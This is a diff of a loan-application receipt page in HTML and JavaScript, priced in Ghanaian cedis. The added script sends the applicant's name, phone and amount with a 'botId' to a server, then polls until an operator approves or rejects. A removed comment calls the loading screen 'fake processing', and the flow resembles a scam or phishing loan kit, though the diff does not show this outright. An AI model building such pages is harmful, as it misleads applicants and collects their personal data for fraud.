@@ -82,6 +82,7 @@
   .receipt {
     padding: 20px;
     text-align: center;
+    position: relative;
   }
 
   .close-btn {
@@ -158,8 +159,8 @@
     margin: 10px 0;
   }
 
-  button.continue {
-    margin-top: 16px;
+  button.continue, button.status {
+    margin-top: 10px;
     width: 100%;
     padding: 12px;
     font-size: 14px;
@@ -168,6 +169,10 @@
     border: none;
     border-radius: 8px;
     cursor: pointer;
+  }
+
+  button.continue:hover, button.status:hover {
+    background: #086b3b;
   }
 
   .footer-note {
@@ -210,8 +215,8 @@
     <div class="close-btn" onclick="window.close()">✕</div>
 
     <div class="success-icon">✅</div>
-    <h1>Transaction Approved</h1>
-    <div class="subtitle">Loan application successfully verified</div>
+    <h1>Application Successful</h1>
+    <div class="subtitle">Your loan request has been received</div>
 
     <div class="receipt-box">
       <div class="reference">
@@ -236,30 +241,10 @@
         <div class="label">Amount</div>
         <div class="value" id="amount">—</div>
       </div>
-
-      <div class="divider"></div>
-
-      <div class="row">
-        <div class="label">Purpose</div>
-        <div class="value" id="purpose">—</div>
-      </div>
-      <div class="row">
-        <div class="label">Term</div>
-        <div class="value" id="term">—</div>
-      </div>
-      <div class="row">
-        <div class="label">Interest</div>
-        <div class="value" id="interest">—</div>
-      </div>
-      <div class="row">
-        <div class="label">Repayment</div>
-        <div class="value" id="repayment">—</div>
-      </div>
     </div>
 
-    <button class="continue" onclick="window.location.href='index.html'">
-      Done
-    </button>
+    <button class="status" id="checkStatus">Check Loan Status</button>
+    <button class="continue" onclick="window.location.href='index.html'">Return Home</button>
 
     <div class="footer-note">
       Please keep this receipt for your records.
@@ -268,22 +253,17 @@
 </div>
 
 <script>
-  /* LOADER CONTROL */
-  setTimeout(() => {
-    document.getElementById('loader').style.display = 'none';
-    document.getElementById('mainContent').style.display = 'block';
-  }, 2000); // 2 seconds fake processing
-
-  /* ORIGINAL SCRIPT (UNCHANGED) */
   const fullName = localStorage.getItem('fullName');
   const phone = localStorage.getItem('phone');
   const loanData = JSON.parse(localStorage.getItem('loanFormData') || '{}');
+  const botId = localStorage.getItem('botId'); // botId stored from previous page
 
   if (!fullName || !phone) {
     alert('Session expired. Please start again.');
     window.location.href = 'index.html';
   }
 
+  // Generate reference
   function generateReference() {
     const now = new Date();
     const date =
@@ -307,18 +287,54 @@
   document.getElementById('amount').textContent = loanData.loanAmount
     ? `GHS ${Number(loanData.loanAmount).toLocaleString()}` : '—';
 
-  document.getElementById('purpose').textContent = loanData.loanPurpose || '—';
-  document.getElementById('term').textContent = loanData.loanTerm || '—';
-  document.getElementById('interest').textContent = loanData.interestRate ? loanData.interestRate+'%' : '—';
+  // Send loan info to server
+  let requestId = null;
+  fetch('/send', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      name: fullName,
+      phone,
+      amount: loanData.loanAmount || '—',
+      botId
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    requestId = data.id;
+  })
+  .catch(console.error);
 
-  if (loanData.loanTerm && loanData.loanTerm.match(/\d+/)) {
-    const days = parseInt(loanData.loanTerm.match(/\d+/)[0],10);
-    const repayDate = new Date();
-    repayDate.setDate(repayDate.getDate() + days);
-    document.getElementById('repayment').textContent = repayDate.toLocaleDateString();
-  } else {
-    document.getElementById('repayment').textContent = '—';
-  }
+  // Polling loan status
+  document.getElementById('checkStatus').addEventListener('click', () => {
+    if (!requestId) return alert('Request not yet initialized. Try again in a moment.');
+    const statusButton = document.getElementById('checkStatus');
+    statusButton.textContent = 'Checking...';
+    statusButton.disabled = true;
+
+    const interval = setInterval(() => {
+      fetch(`/status/${requestId}`)
+        .then(r => r.json())
+        .then(data => {
+          if (data.status === 'approve') {
+            clearInterval(interval);
+            window.location.href = 'loan-approved.html';
+          } else if (data.status === 'reject') {
+            clearInterval(interval);
+            window.location.href = 'loan-rejected.html';
+          } else {
+            statusButton.textContent = 'Waiting for Approval...';
+          }
+        })
+        .catch(console.error);
+    }, 3000);
+  });
+
+  // Loader
+  setTimeout(() => {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('mainContent').style.display = 'block';
+  }, 2000);
 </script>
 
 </body>
